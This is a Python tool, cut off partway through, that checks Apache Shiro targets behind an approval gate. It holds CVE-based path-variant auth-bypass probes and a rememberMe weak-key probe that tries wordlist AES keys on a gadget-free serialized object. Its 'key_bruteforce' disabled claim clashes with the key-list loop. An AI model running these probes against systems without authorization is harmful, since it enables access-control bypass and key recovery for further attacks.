#!/usr/bin/env python3
"""Approval-gated, low-impact Apache Shiro auth-bypass review.

Two phases:

* Plan (default, offline, zero requests): read high- and medium-confidence
  rows from ``shiro_candidates.jsonl`` and produce a bounded list of read-only
  GET path-variant probes that *would* be sent, written as
  ``shiro_bypass_approval_queue.csv`` (with an ``approved`` column defaulting
  to ``no``). Medium rows are labelled ``confidence=medium`` and their
  ``rememberme_repro`` still needs an explicit tick before any key probe runs.
  Low-confidence candidates never enter the queue.

* Review (explicit, needs approval): only rows whose approval queue entry has
  been marked ``yes`` are probed. The review sends a handful of inert GET
  requests per candidate (path separators, semicolon, ``%3b``, ``%20``,
  ``%2e%2e``, trailing slash) and compares status code / title / length / hash
  against a baseline. For candidates that also matched a rememberMe signal it
  sends one extra ordinary ``rememberMe=1`` cookie to confirm the Shiro
  deleteMe liveness signal. If the same row also has ``rememberme_repro=yes``
  (same queue, single approval), the review runs an inert
  ``SimplePrincipalCollection`` key probe (AES-CBC/GCM + deleteMe difference,
  no command execution, no DNS callback infrastructure) that stops at the first
  confirmed weak key. It never executes commands, uploads files, or installs
  memory shells.

Everything the plan proposes is read-only GET and is shown to the operator
before any request is sent.
"""

from __future__ import annotations

import argparse
import base64
import csv
import hashlib
import json
import re
import shutil
import subprocess
import tempfile
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, urlunparse

from api_discovery import append_jsonl, now_iso, title_of


USER_AGENT = "Authorized-Shiro-Bypass-Review/1.0"

APPROVED_VALUES = {"yes", "true", "1", "approve", "approved", "y", "on"}

# Path-variant probes mirroring the classic Shiro/Spring auth-bypass family.
# Each entry: (label, transform(base_path) -> variant_path).
# base_path is expected to be an absolute path like "/admin/".
BYPASS_VARIANTS = [
    ("cve2020_1957_semicolon_dotdot", lambda p: f"/x/..;{p}"),
    ("cve2020_11989_leading_semicolon", lambda p: f"/;{p}"),
    ("cve2020_13933_percent3b", lambda p: f"{p.rstrip('/')}/%3b"),
    ("cve2020_17523_percent20", lambda p: f"{p.rstrip('/')}/%20"),
    ("cve2020_17510_percent2e2e", lambda p: f"/%2e%2e{p}"),
    ("trailing_slash", lambda p: f"{p.rstrip('/')}/"),
]

REDIRECT_OR_DENY_STATUS = {301, 302, 303, 307, 308, 401, 403}

LOGIN_KEYWORD_RE = re.compile(
    r"(login|signin|sign-in|sso|cas|auth|password|passwd|登录|认证|统一认证|密码|账号|用户名|后台|管理)",
    re.I,
)


@dataclass
class FetchResult:
    url: str
    status: int = 0
    final_url: str = ""
    content_type: str = ""
    content_length: str = ""
    text: str = ""
    sample_sha256: str = ""
    title: str = ""
    error: str = ""
    headers_raw: str = ""
    set_cookies: list[str] = field(default_factory=list)


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def read_jsonl(path: Path) -> list[dict]:
    rows: list[dict] = []
    if not path.exists():
        return rows
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        if not line.strip():
            continue
        try:
            row = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(row, dict):
            rows.append(row)
    return rows


def host_of(url: str) -> str:
    try:
        return (urlparse(url).hostname or "").lower()
    except Exception:
        return ""


def origin_of(url: str) -> str:
    try:
        parsed = urlparse(url)
    except Exception:
        return url.rstrip("/")
    if parsed.scheme and parsed.netloc:
        return f"{parsed.scheme}://{parsed.netloc}".rstrip("/")
    return url.rstrip("/")


def base_path_of(url: str) -> str:
    """Derive a plausible protected-path base from a candidate URL.

    Prefers a directory-ish path: /login.html -> /, /netface -> /netface/,
    /nndwyw/login.html -> /nndwyw/. Falls back to '/'.
    """
    try:
        path = urlparse(url).path or "/"
    except Exception:
        path = "/"
    if not path.startswith("/"):
        path = "/" + path
    segments = [seg for seg in path.split("/") if seg]
    if not segments:
        return "/"
    if path.endswith("/"):
        return path
    # Drop the last "file" segment unless it looks like a directory keyword.
    return "/" + "/".join(segments[:-1]) + "/" if len(segments) > 1 else "/"


def append_slash(path: str) -> str:
    return path if path.endswith("/") else path + "/"


def fetch_once(url: str, run_dir: Path, timeout: int, follow: bool = False, cookie: str = "", capture_headers: bool = False) -> FetchResult:
    curl = shutil.which("curl.exe") or shutil.which("curl")
    result = FetchResult(url=url, final_url=url)
    if not curl:
        result.error = "curl_not_found"
        return result
    tmp_dir = run_dir / ".shiro_bypass_tmp"
    tmp_dir.mkdir(parents=True, exist_ok=True)
    with tempfile.NamedTemporaryFile(dir=tmp_dir, delete=False) as body_f:
        body_path = Path(body_f.name)
    header_path: Path | None = None
    if capture_headers:
        with tempfile.NamedTemporaryFile(dir=tmp_dir, delete=False) as header_f:
            header_path = Path(header_f.name)
    cmd = [
        curl,
        "-k",
        "--silent",
        "--show-error",
        "--max-time",
        str(timeout),
        "--connect-timeout",
        str(min(4, timeout)),
        "--range",
        "0-262143",
        "-A",
        USER_AGENT,
        "-o",
        str(body_path),
        "-w",
        "%{http_code} %{url_effective}",
    ]
    if header_path is not None:
        cmd.extend(["-D", str(header_path)])
    if cookie:
        cmd.extend(["-H", f"Cookie: {cookie}"])
    if follow:
        cmd.append("-L")
    cmd.append(url)
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 3, check=False)
        parts = proc.stdout.strip().split(" ", 1)
        result.status = int(parts[0]) if parts and parts[0].isdigit() else 0
        result.final_url = parts[1] if len(parts) > 1 else url
        body = body_path.read_bytes() if body_path.exists() else b""
        result.text = body.decode("utf-8", errors="ignore")
        result.sample_sha256 = sha256(body[:65536])
        result.title = title_of(result.text)
        result.content_length = str(len(body))
        if header_path is not None and header_path.exists():
            result.headers_raw = header_path.read_text(encoding="utf-8", errors="ignore")
            for set_cookie_line in re.findall(r"(?im)^set-cookie:\s*(.+)\s*$", result.headers_raw):
                value = set_cookie_line.strip()
                if value and value not in result.set_cookies:
                    result.set_cookies.append(value)
        if proc.returncode != 0:
            result.error = proc.stderr.strip()[:300]
    except Exception as exc:  # noqa: BLE001
        result.error = str(exc)[:300]
    finally:
        cleanup_paths = [body_path]
        if header_path is not None:
            cleanup_paths.append(header_path)
        for path in cleanup_paths:
            try:
                path.unlink()
            except OSError:
                pass
    return result


REMEMBERME_SIGNALS = {"invalid_rememberme_deleted", "rememberme_set_cookie_present"}

DELETE_ME_RE = re.compile(r"[^;=\s]+\s*=\s*deleteme\s*(?:;|$)", re.I)

SHIRO_KEYS_CANDIDATE_FILES = [
    Path("tools") / "shiro" / "shiro_attack2" / "data" / "shiro_keys.txt",
    Path("tools") / "shiro" / "shiro" / "data" / "shiro_keys.txt",
    Path("tools") / "shiro_keys_master.txt",
    Path("tools") / "dddd" / "gopocs" / "dict" / "shirokeys.txt",
    Path("tools") / "dddd" / "common" / "config" / "pocs" / "helpers" / "wordlists" / "shiro_encrypted_keys.txt",
]

# Inert org.apache.shiro.subject.SimplePrincipalCollection serialized object used
# only to confirm a rememberMe key (CBC vs GCM) via the deleteMe response gap.
# It holds no gadgets and does not execute commands; identical to the probe in
# tools/dddd/gopocs/shiro.go.
SHIRO_PRINCIPAL_GADGETLESS = base64.b64decode(
    "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
)


def load_shiro_keys() -> list[str]:
    """Return de-duplicated Shiro keys from the bundled reference lists.

    Some wordlists store ``<key>:<base64 encrypted sample>`` pairs (e.g.
    dddd's ``shiro_encrypted_keys.txt``); only the key half is taken. Base64
    keys never contain ``:``, so splitting on the first colon is safe. Junk
    lines that are not a valid 16/24/32-byte base64 key are dropped so
    ``keys_total`` reflects the real number of testable keys.
    """
    keys: list[str] = []
    seen: set[str] = set()
    for path in SHIRO_KEYS_CANDIDATE_FILES:
        if not path.exists():
            continue
        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
            key = line.strip().split(":", 1)[0].strip()
            if not key or key in seen:
                continue
            try:
                raw = base64.b64decode(key)
            except Exception:
                continue
            if len(raw) not in {16, 24, 32}:
                continue
            seen.add(key)
            keys.append(key)
    return keys


def _pkcs7_pad(data: bytes, block_size: int) -> bytes:
    pad_len = block_size - len(data) % block_size
    return data + bytes([pad_len]) * pad_len


def _aes_cbc_encrypt(key: bytes, content: bytes) -> str:
    from Crypto.Cipher import AES  # lazy import keeps read-only path import-light

    iv = hashlib.sha256(content + key).digest()[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(_pkcs7_pad(content, AES.block_size))
    return base64.b64encode(iv + ct).decode("ascii")


def _aes_gcm_encrypt(key: bytes, content: bytes) -> str:
    from Crypto.Cipher import AES

    nonce = hashlib.sha256(content + key).digest()[:16]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(content)
    return base64.b64encode(nonce + ct + tag).decode("ascii")


def _probe_response_state(res: FetchResult) -> str:
    """Classify a rememberMe probe response.

    The deleteMe signal is read strictly from response Set-Cookie headers:
    including body text would be unreliable because real Shiro login pages
    often contain the literal string ``deleteMe`` in their HTML/JS.

    Returns one of:
      'miss'          -> server answered 2xx and cleared the cookie (deleteMe):
                         the key did NOT decrypt.
      'clean_hit'     -> server answered normally (2xx, no error, no deleteMe):
                         decrypt+deserialize path looks hit.
      'suspect_hit'   -> no deleteMe but the connection misbehaved (error /
                         non-2xx / empty reply). Could be a real decrypt hit that
                         makes the app stall, or plain network flakiness. Needs a
                         baseline contrast before trusting it.
    """
    header_blob = "\n".join(res.set_cookies) + "\n" + res.headers_raw
    if "deleteme" in header_blob.lower():
        return "miss"
    if res.error or res.status not in {200, 201, 202}:
        return "suspect_hit"
    return "clean_hit"


def rememberme_key_probe(run_dir: Path, timeout: int, delay: float, url: str, key_cap: int = 0) -> dict:
    """Confirm a Shiro rememberMe AES key using only an inert serialized object.

    Follows the same technique as tools/dddd/gopocs/shiro.go: send
    rememberMe=<key-cbc/gcm encrypted inert SimplePrincipalCollection> and check
    whether the response still answers with ``rememberMe=deleteMe``. A matching
    key makes Shiro decrypt/deserialize successfully (no deleteMe), while a wrong
    key yields deleteMe. Two consecutive non-deleteMe responses confirm the hit
    and the loop stops after the first confirmed key (cap respected).

    A response that shows no deleteMe but also carries a transport error (for
    example an empty reply after the server starts decrypting) is treated as a
    ``suspect_hit`` and is validated with a baseline contrast: a random wrong
    key must produce a clean ``miss`` (200 + deleteMe) for the suspect hit to be
    reported as confirmed.
    """
    from Crypto.Cipher import AES  # noqa: F401  (validates key lengths)

    keys = load_shiro_keys()
    if key_cap > 0:
        keys = keys[:key_cap]
    matched: dict | None = None
    attempts = 0
    confirmations = 0
    for key in keys:
        try:
            raw = base64.b64decode(key)
        except Exception:
            continue
        if len(raw) not in {16, 24, 32}:
            continue
        variants = [
            ("cbc", _aes_cbc_encrypt(raw, SHIRO_PRINCIPAL_GADGETLESS)),
            ("gcm", _aes_gcm_encrypt(raw, SHIRO_PRINCIPAL_GADGETLESS)),
        ]
        for mode, cookie_value in variants:
            attempts += 1
            res = fetch_once(url, run_dir, timeout, follow=False, cookie=f"rememberMe={cookie_value}", capture_headers=True)
            if delay > 0:
                time.sleep(delay)
            state = _probe_response_state(res)
            if state == "miss":
                continue
            # Potential hit (clean or suspect): confirm with a second identical probe.
            second = fetch_once(url, run_dir, timeout, follow=False, cookie=f"rememberMe={cookie_value}", capture_headers=True)
            attempts += 1
            if delay > 0:
                time.sleep(delay)
            state2 = _probe_response_state(second)
            m2 = matched_state(state, state2)
            if m2 in {"confirmed", "suspect_confirmed"}:
                confirmations += 1
                # Both paths validate with a baseline contrast: a random wrong
                # key must answer with a clean miss (200 + deleteMe). If a wrong
                # key also produces no deleteMe, the observation is not
                # key-specific and the hit is not trusted.
                contrast_ok = _baseline_contrast(run_dir, timeout, delay, url)
                attempts += contrast_ok.get("probes_used", 0)
                if not contrast_ok.get("baseline_is_miss"):
                    continue
                if m2 == "confirmed":
                    matched = {"key": key, "mode": mode, "attempts": attempts, "confidence": "confirmed"}
                    break
                matched = {"key": key, "mode": mode, "attempts": attempts, "confidence": "suspect_confirmed"}
                break
        if matched:
            break
    return {
        "url": url,
        "matched": matched is not None,
        "key": matched["key"] if matched else None,
        "mode": matched["mode"] if matched else None,
        "confidence": matched["confidence"] if matched else None,
        "confirmations": confirmations,
        "keys_tried": attempts,
        "keys_total": len(keys),
        "note": "Inert SimplePrincipalCollection only; no command execution, no DNS callback infrastructure required, stop at first confirmed key. A hit requires two no-deleteMe responses AND a random-wrong-key baseline contrast that cleanly misses (200 + deleteMe); a transport-error hit (suspect) is only trusted after the same contrast.",
    }


def matched_state(first: str, second: str) -> str:
    if first == "clean_hit" and second == "clean_hit":
        return "confirmed"
    if first == "miss" or second == "miss":
        return "miss"
    if first in {"clean_hit", "suspect_hit"} and second in {"clean_hit", "suspect_hit"}:
        return "suspect_confirmed"
    return "miss"


def _baseline_contrast(run_dir: Path, timeout: int, delay: float, url: str) -> dict:
    """Send one random-wrong-key CBC probe and confirm it behaves as a clean miss.

    A real Shiro validates the key: a wrong key must answer 200 + deleteMe. If the
    target ALSO fails to answer with deleteMe to a wrong key, the earlier
    'no deleteMe' observation is not key-specific and must not be trusted.
    """
    import os

    probes_used = 0
    for _ in range(2):
        bad_raw = os.urandom(16)
        cookie_bad = _aes_cbc_encrypt(bad_raw, SHIRO_PRINCIPAL_GADGETLESS)
        res = fetch_once(url, run_dir, timeout, follow=False, cookie=f"rememberMe={cookie_bad}", capture_headers=True)
        probes_used += 1
        if delay > 0:
            time.sleep(delay)
        if _probe_response_state(res) == "miss":
            return {"baseline_is_miss": True, "probes_used": probes_used}
    return {"baseline_is_miss": False, "probes_used": probes_used}


def rememberme_liveness(run_dir: Path, timeout: int, delay: float, url: str) -> dict:
    """Read-only live check for the Shiro rememberMe path.

    Sends a lone ordinary ``rememberMe=1`` cookie (never a serialized payload)
    and reports whether the target actually answers with ``rememberMe=deleteMe``.
    This is the same inert signal the triage stage relies on and is strictly a
    GET; it does not confirm any key and reaches no further than a normal cookie.
    """
    result = fetch_once(url, run_dir, timeout, follow=False, cookie="rememberMe=1", capture_headers=True)
    header_blob = "\n".join(result.set_cookies) + "\n" + result.headers_raw
    delete_me = "deleteme" in header_blob.lower()
    if delay > 0:
        time.sleep(delay)
    return {
        "url": url,
        "alive": delete_me,
        "signal": "delete_me_response" if delete_me else "no_delete_me_response",
        "status": result.status,
        "set_cookies": list(result.set_cookies),
        "note": "Only an ordinary rememberMe=1 cookie was sent; no key was tested and no serialized payload was sent.",
    }


def queued_candidates(run_dir: Path) -> list[dict]:
    """High- and medium-confidence Shiro fingerprint rows enter the approval queue.

    Medium rows are labelled ``confidence=medium`` and keep ``rememberme_repro``
    at ``no`` so running the weak-key probe still needs an explicit per-row tick
    (low risk, only surfaces candidates for human decision). Low-confidence rows
    never enter the queue. Rows are merged per URL so the same fingerprint/target
    produces exactly one approval item even if multiple signals matched; the
    strongest confidence across merged rows wins.
    """
    order: list[str] = []
    merged: dict[str, dict] = {}
    rank = {"none": 0, "low": 1, "medium": 2, "high": 3}
    for row in read_jsonl(run_dir / "shiro_candidates.jsonl"):
        confidence = str(row.get("confidence") or "none")
        if confidence not in {"medium", "high"} or not row.get("url"):
            continue
        url = str(row.get("url") or "").rstrip("/")
        if url not in merged:
            order.append(url)
            merged[url] = {
                "url": url,
                "host": row.get("host") or host_of(url),
                "confidence": confidence,
                "signals": [],
            }
        entry = merged[url]
        if rank.get(confidence, 0) > rank.get(entry["confidence"], 0):
            entry["confidence"] = confidence
        for sig in (row.get("signals") or []):
            if sig and sig not in entry["signals"]:
                entry["signals"].append(sig)
    result = [merged[url] for url in order]
    for entry in result:
        entry["signals"] = sorted(entry["signals"])
    return result


def build_probe_plan(candidate: dict) -> dict:
    url = str(candidate.get("url") or "").rstrip("/")
    base = base_path_of(url)
    signals = sorted(candidate.get("signals") or [])
    rememberme_signals = sorted(set(signals) & REMEMBERME_SIGNALS)
    variants = []
    for label, transform in BYPASS_VARIANTS:
        variant_path = transform(base)
        variant_url = origin_of(url) + variant_path
        variants.append({
            "label": label,
            "path": variant_path,
            "url": variant_url,
            "method": "GET",
            "note": "read-only GET path variant; compares status/title/length/hash against baseline",
        })
    return {
        "url": url,
        "host": candidate.get("host") or host_of(url),
        "confidence": candidate.get("confidence"),
        "signals": signals,
        "base_path": base,
        "rememberme_repro": "no",
        "rememberme": {
            "detected": bool(rememberme_signals),
            "signals": rememberme_signals,
            "verification": "manual_shiroattack2_single_target_only",
            "auto_action": "none",
            "liveness_probe": {
                "method": "GET",
                "cookie": "rememberMe=1",
                "note": "read-only ordinary cookie; a deleteMe response confirms a live Shiro rememberMe path",
            },
            "key_probe": {
                "authorization": "rememberme_repro_col",
                "note": "勾选本行 rememberme_repro 列后，将用 inert SimplePrincipalCollection + AES-CBC/GCM + deleteMe 差异确认已知弱 key（无命令执行、无 DNS 回连设施，命中即停）",
            },
            "note": "rememberMe 反序列化复现由本队列同一行的 rememberme_repro 列授权；只读探针（approved=yes）不触发任何序列化载荷。",
        },
        "baseline_probe": {
            "url": url,
            "method": "GET",
            "note": "baseline response for the detected Shiro/login page",
        },
        "variants": variants,
        "request_budget": 1 + len(variants) + (1 if rememberme_signals else 0),
        "disabled_actions": ["key_bruteforce", "serialized_payload", "command_execution", "memory_shell", "file_upload"],
    }


def load_seen_plan_ids(run_dir: Path) -> set[str]:
    seen: set[str] = set()
    queue_path = run_dir / "shiro_bypass_approval_queue.jsonl"
    for row in read_jsonl(queue_path):
        pid = str(row.get("plan_id") or "")
        if pid:
            seen.add(pid)
    return seen


def load_seen_urls(run_dir: Path) -> set[str]:
    seen: set[str] = set()
    queue_path = run_dir / "shiro_bypass_approval_queue.jsonl"
    for row in read_jsonl(queue_path):
        url = str(row.get("url") or "").rstrip("/")
        if url:
            seen.add(url)
    return seen


def plan_id_of(url: str) -> str:
    """Stable, process-independent plan id derived from the URL.

    Python's builtin hash() is salted per process, so using it would produce
    different ids across runs and break dedup of already-queued rows.
    """
    return hashlib.sha256(url.encode("utf-8")).hexdigest()[:16]


def _dedupe_queue(run_dir: Path, plans: list[dict]) -> None:
    """Rewrite the queue keeping at most one row per URL.

    Older queue rows used a process-random numeric plan_id, so the same target
    could appear multiple times. Keep the first row per URL but preserve any
    approval already given (approve later rows win so user decisions survive).
    """
    queue_path = run_dir / "shiro_bypass_approval_queue.jsonl"
    rows = read_jsonl(queue_path)
    fresh_by_url = {plan["url"]: plan for plan in plans}
    by_url: dict[str, dict] = {}
    order: list[str] = []
    for row in rows:
        url = str(row.get("url") or "").rstrip("/")
        if url in fresh_by_url:
            url = fresh_by_url[url]["url"]
        if url not in by_url:
            by_url[url] = row
            order.append(url)
            continue
        cur_approved = str(by_url[url].get("approved") or "").strip().lower()
        new_approved = str(row.get("approved") or "").strip().lower()
        if new_approved in APPROVED_VALUES and cur_approved not in APPROVED_VALUES:
            by_url[url] = row
    for url in order:
        kept = by_url[url]
        if url in fresh_by_url:
            for key, value in fresh_by_url[url].items():
                kept.setdefault(key, value)
            kept["plan_id"] = plan_id_of(url)
        by_url[url] = kept
    queue_path.write_text("", encoding="utf-8")
    for url in order:
        append_jsonl(queue_path, by_url[url])


def write_plan_outputs(run_dir: Path, plans: list[dict]) -> None:
    queue_jsonl = run_dir / "shiro_bypass_approval_queue.jsonl"
    _dedupe_queue(run_dir, plans)
    seen_ids = load_seen_plan_ids(run_dir)
    seen_urls = load_seen_urls(run_dir)
    fresh: list[dict] = []
    for plan in plans:
        plan_id = plan_id_of(plan["url"])
        if plan_id in seen_ids or plan["url"] in seen_urls:
            continue
        seen_ids.add(plan_id)
        seen_urls.add(plan["url"])
        row = {
            "plan_id": plan_id,
            "approved": "no",
            "generated_at": now_iso(),
            **plan,
        }
        append_jsonl(queue_jsonl, row)
        fresh.append(row)

    csv_path = run_dir / "shiro_bypass_approval_queue.csv"
    fieldnames = [
        "plan_id", "url", "host", "confidence", "signals", "rememberme",
        "base_path", "request_budget", "approved", "rememberme_repro", "reviewed", "result", "note",
    ]
    rows = []
    for row in read_jsonl(queue_jsonl):
        row.setdefault("rememberme_repro", "no")
        display = dict(row)
        rememberme = display.get("rememberme") if isinstance(display.get("rememberme"), dict) else {}
        display["rememberme"] = "yes" if rememberme.get("detected") else "no"
        display["signals"] = ",".join(row.get("signals") or [])
        rows.append(dict((key, display.get(key, "")) for key in fieldnames))
    with csv_path.open("w", encoding="utf-8-sig", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=fieldnames)
        writer.writeheader()
        for row in rows:
            writer.writerow(row)

    md_lines = [
        "# Shiro 权限绕过复核（待批准操作清单）",
        "",
        f"- Generated: {now_iso()}",
        f"- Queue items: {len(rows)}",
        "",
        "## 说明",
        "",
        "- `shiro_candidates.jsonl` 中 `confidence=high`/`medium` 的候选进入本清单，且同一目标（URL）只占一行；低置信度不入队。medium 行标为 `confidence=medium`，`rememberme_repro` 默认 `no`——只有你勾选该列才跑弱 key 探测。",
        "- `rememberme` 列 = yes 表示该目标同时命中 rememberMe 高信号（如 `invalid_rememberme_deleted`）。",
        "- `approved` 列 = yes：允许只读探针（1 次基线 + 路径变体 GET；对 rememberMe 命中目标额外发 1 次普通 `rememberMe=1` cookie 确认活体）。全部为只读 GET，不触发序列化载荷。",
        "- `rememberme_repro` 列 = yes：**额外授权 rememberMe 反序列化复现**——用 inert `SimplePrincipalCollection`（无 gadget、无命令执行）+ AES-CBC/GCM + deleteMe 差异确认已知弱 key，命中即停，无需 DNS 回连设施。",
        "- 硬性红线（改密码 / 导数据 / 留后门 / 命令执行 / 上传 / 内存马 / 攻击非授权目标）在任何 yes 下仍然禁用。",
        "- 批准方式：把对应行的 `approved` 和/或 `rememberme_repro` 改成 `yes`，再运行 `--shiro-bypass-review`。",
        "",
    ]
    if rows:
        md_lines.append("| plan_id | url | base_path | probes | rememberme | approved | rememberme_repro |")
        md_lines.append("| --- | --- | --- | --- | --- | --- | --- |")
        for row in rows:
            md_lines.append(
                f"| {row.get('plan_id')} | {row.get('url')} | {row.get('base_path')} | {row.get('request_budget')} | {row.get('rememberme')} | {row.get('approved')} | {row.get('rememberme_repro')} |"
            )
    else:
        md_lines.append("No high/medium-confidence Shiro candidates.")
    (run_dir / "shiro_bypass_approval_required.md").write_text("\n".join(md_lines) + "\n", encoding="utf-8")


def run_plan(run_dir: Path) -> dict:
    candidates = queued_candidates(run_dir)
    plans = [build_probe_plan(candidate) for candidate in candidates]
    write_plan_outputs(run_dir, plans)
    manifest = {
        "created_at": now_iso(),
        "queued_candidates": len(candidates),
        "queued_items": len(plans),
        "request_policy": "read_only_get_only",
        "disabled_actions": ["key_bruteforce", "serialized_payload", "command_execution", "memory_shell", "file_upload"],
        "queue_csv": str(run_dir / "shiro_bypass_approval_queue.csv"),
        "approval_required_md": str(run_dir / "shiro_bypass_approval_required.md"),
    }
    (run_dir / "shiro_bypass_plan_manifest.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return manifest


def load_approved_rows(run_dir: Path) -> list[dict]:
    approved: list[dict] = []
    for row in read_jsonl(run_dir / "shiro_bypass_approval_queue.jsonl"):
        if str(row.get("approved") or "").strip().lower() in APPROVED_VALUES:
            approved.append(row)
    return approved


def similarity(a: str, b: str) -> float:
    if not a and not b:
        return 1.0
    sa = set(a.lower().split())
    sb = set(b.lower().split())
    if not sa and not sb:
        return 1.0
    return len(sa & sb) / max(1, len(sa | sb))


def analyze_baseline_variant(baseline: FetchResult, variant: FetchResult) -> dict:
    signals: list[str] = []
    outcome = "no_signal"

    baseline_deny = baseline.status in REDIRECT_OR_DENY_STATUS
    baseline_login_text = bool(LOGIN_KEYWORD_RE.search(baseline.text[:4000]))
    variant_open = variant.status == 200 or variant.status in {200, 201, 202}

    if baseline.error or variant.error:
        outcome = "fetch_error"
        signals.append("fetch_error")
        return {"outcome": outcome, "signals": signals, "baseline_status": baseline.status, "variant_status": variant.status}

    if baseline_deny and variant_open and baseline.status != variant.status:
        signals.append("deny_to_open_status")
        outcome = "bypass_likely"
    elif variant.status != baseline.status:
        signals.append("status_delta")
        outcome = "status_delta"
    else:
        body_similarity = similarity(baseline.text, variant.text)
        if body_similarity < 0.60:
            signals.append("body_content_delta")
            outcome = "content_delta"
        elif baseline_login_text and not LOGIN_KEYWORD_RE.search(variant.text[:4000]):
            signals.append("login_marker_lost")
            outcome = "content_delta"

    return {
        "outcome": outcome,
        "signals": signals,
        "baseline_status": baseline.status,
        "variant_status": variant.status,
        "baseline_length": len(baseline.text),
        "variant_length": len(variant.text),
        "baseline_sha256": baseline.sample_sha256,
        "variant_sha256": variant.sample_sha256,
        "body_similarity": round(similarity(baseline.text, variant.text), 3),
    }


def run_review(run_dir: Path, delay: float, timeout: int) -> dict:
    approved = load_approved_rows(run_dir)
    results: list[dict] = []
    candidates: list[dict] = []
    attempted = 0
    requests_sent = 0
    liveness_confirmed: list[str] = []
    repro_hits: list[dict] = []

    for plan in approved:
        url = str(plan.get("url") or "")
        if not url:
            continue
        baseline = fetch_once(url, run_dir, timeout, follow=False)
        attempted += 1
        requests_sent += 1
        if delay > 0:
            time.sleep(delay)
        variant_results = []
        for variant in plan.get("variants") or []:
            vurl = str(variant.get("url") or "")
            if not vurl:
                continue
            vres = fetch_once(vurl, run_dir, timeout, follow=False)
            requests_sent += 1
            if delay > 0:
                time.sleep(delay)
            analysis = analyze_baseline_variant(baseline, vres)
            variant_results.append({
                "label": variant.get("label"),
                "path": variant.get("path"),
                "url": vurl,
                **analysis,
            })
        likely = [v for v in variant_results if v.get("outcome") == "bypass_likely"]
        delta = [v for v in variant_results if v.get("outcome") in {"status_delta", "content_delta"}]
        if likely:
            confidence = "high"
            finding = "shiro_auth_bypass_likely"
        elif delta:
            confidence = "medium"
            finding = "shiro_auth_bypass_response_delta"
        else:
            confidence = "low"
            finding = "shiro_auth_bypass_not_observed"

        rememberme = plan.get("rememberme") or {"detected": False, "signals": []}
        liveness: dict | None = None
        repro_result: dict | None = None
        if rememberme.get("detected"):
            liveness = rememberme_liveness(run_dir, timeout, delay, url)
            requests_sent += 1
            repro_approved = str(plan.get("rememberme_repro") or "").strip().lower() in APPROVED_VALUES
            if liveness.get("alive"):
                liveness_confirmed.append(url)
            if liveness.get("alive") and repro_approved:
                repro_result = rememberme_key_probe(run_dir, timeout, delay, url)
                requests_sent += repro_result.get("keys_tried", 0)
                if repro_result.get("matched"):
                    repro_hits.append({
                        "url": url,
                        "host": plan.get("host") or host_of(url),
                        "key": repro_result.get("key"),
                        "mode": repro_result.get("mode"),
                        "confidence": repro_result.get("confidence"),
                        "keys_tried": repro_result.get("keys_tried", 0),
                        "keys_total": repro_result.get("keys_total", 0),
                    })

        row = {
            "checked_at": now_iso(),
            "plan_id": plan.get("plan_id"),
            "url": url,
            "host": plan.get("host") or host_of(url),
            "base_path": plan.get("base_path"),
            "rememberme": rememberme,
            "rememberme_liveness": liveness,
            "rememberme_repro": repro_result,
            "confidence": confidence,
            "finding": finding,
            "variants_tested": len(variant_results),
            "bypass_likely_variants": [v["label"] for v in likely],
            "delta_variants": [v["label"] for v in delta],
            "variant_results": variant_results,
            "baseline_status": baseline.status,
            "baseline_title": baseline.title,
            "baseline_sha256": baseline.sample_sha256,
        }
        append_jsonl(run_dir / "shiro_bypass_results.jsonl", row)
        results.append(row)
        if confidence in {"high", "medium"}:
            append_jsonl(run_dir / "shiro_bypass_candidates.jsonl", row)
            candidates.append(row)

    detected = sorted({str(row["url"]) for row in candidates})
    (run_dir / "shiro_bypass_candidates.txt").write_text("\n".join(detected) + ("\n" if detected else ""), encoding="utf-8")

    if repro_hits:
        hits_md = [
            "# Shiro rememberMe 弱 key 命中汇总",
            "",
            f"- Generated: {now_iso()}",
            f"- Confirmed keys: {len(repro_hits)}",
            "",
            "## 明细",
            "",
        ]
        for item in repro_hits:
            hits_md.append(f"- URL: {item['url']}")
            hits_md.append(f"  - key: {item['key']}（{item['mode']}）")
            hits_md.append(
                f"  - 置信度：{item.get('confidence')}"
                + ("（suspect 需人工复核：命中表现为连接中断/空响应而非正常 2xx）" if item.get("confidence") == "suspect_confirmed" else "")
            )
            hits_md.append(f"  - 尝试 key 数：{item['keys_tried']} / {item['keys_total']}")
        (run_dir / "shiro_rememberme_key_hits.md").write_text("\n".join(hits_md) + "\n", encoding="utf-8")

    manifest = {
        "created_at": now_iso(),
        "approved_items": len(approved),
        "attempted": attempted,
        "requests_sent": requests_sent,
        "candidates": len(candidates),
        "rememberme_liveness_confirmed": len(liveness_confirmed),
        "rememberme_key_hits": len(repro_hits),
        "request_policy": "read_only_get_only_plus_approved_inert_key_probe",
        "disabled_actions": ["command_execution", "memory_shell", "file_upload", "sensitive_data_export"],
        "reproduction_policy": "same_queue_rememberme_repro_column",
        "interpretation": "bypass_likely means the variant returned 2xx after a deny/redirect baseline; it is a candidate, not a confirmed exploit. rememberMe key hits use the inert SimplePrincipalCollection technique and stop at the first confirmed key.",
        "candidates_file": str(run_dir / "shiro_bypass_candidates.txt"),
        "key_hits_file": str(run_dir / "shiro_rememberme_key_hits.md"),
    }
    (run_dir / "shiro_bypass_review_manifest.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return manifest


def main() -> int:
    parser = argparse.ArgumentParser(description="Approval-gated low-impact Apache Shiro auth-bypass review")
    parser.add_argument("--run-dir", type=Path, required=True)
    parser.add_argument("--plan", action="store_true", help="Build the approval queue from high/medium-confidence Shiro candidates (offline, no requests)")
